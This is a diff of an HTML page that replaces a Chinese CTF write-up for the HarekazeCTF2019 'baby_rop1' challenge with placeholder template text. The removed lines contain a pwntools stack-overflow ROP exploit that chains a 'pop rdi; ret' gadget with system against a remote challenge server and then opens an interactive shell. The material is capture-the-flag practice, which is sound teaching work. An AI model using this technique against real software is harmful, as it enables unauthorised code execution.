@@ -206,23 +206,20 @@
     <main>
         <div class="maintext">
             <br>
-            <div class="head01">BUUCTF-[HarekazeCTF2019]baby_rop1</div>
+            <div class="head01">Problem Head</div>
             <br>
-            <div class="head02">EXP</div>
+            <div class="head02">Block's Name</div>
             <br>
 
-            <div class="maintxt">checksec后可以用栈溢出做
+            <div class="maintxt">Main Texts
             
-            <pre><code>from pwn import *
-    # id=process('./babyrop')
-    id=remote('node4.buuoj.cn',28284)
-    shadd=0x601048
-    # 0x18
-    payload='a'*0x18+p64(0x400683).decode("iso-8859-1")+p64(shadd).decode("iso-8859-1")+p64(0x400490).decode("iso-8859-1")
-    id.sendline(payload)
-    id.interactive()
-    # 64位ELF调用函数system构造payload ： fill + address‘pop rdi ; ret’ + command_address + system_address）
-    # 此题flag藏得深，可以用find / -name 'flag'
+            <pre><code>Codes
+    Codes
+    Codes
+    Codes
+
+
+
             </code></pre><br><br><br>
             </div><br><br><br><br><br><br>
             
